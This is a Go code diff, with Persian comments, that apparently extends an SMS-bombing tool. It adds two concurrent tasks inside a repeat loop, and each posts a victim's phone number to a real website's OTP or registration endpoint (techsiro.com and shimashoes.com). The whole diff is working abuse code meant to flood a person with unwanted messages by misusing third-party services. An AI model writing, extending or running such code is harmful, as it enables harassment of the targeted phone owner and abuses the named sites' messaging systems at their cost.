@@ -344,6 +344,28 @@ cookieJar, _ := cookiejar.New(nil)
 	}
 
 	for i := 0; i < repeatCount; i++ {
+// techsiro.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+			return func() {
+				formData := url.Values{}
+				formData.Set("client", "web")
+				formData.Set("method", "POST")
+				formData.Set("_token", "")
+				formData.Set("mobile", phone)
+				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) // ارسال c
+			}
+		}(client) // ارسال client اصلی به تابع خارجی
+
+		// shimashoes.com (Registration - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+			return func() {
+				formData := url.Values{}
+				formData.Set("email", phone)
+				sendFormRequest(c, ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // ارسال c
+			}
+		}(client) // ارسال client اصلی به تابع خارجی
 
 
                     }
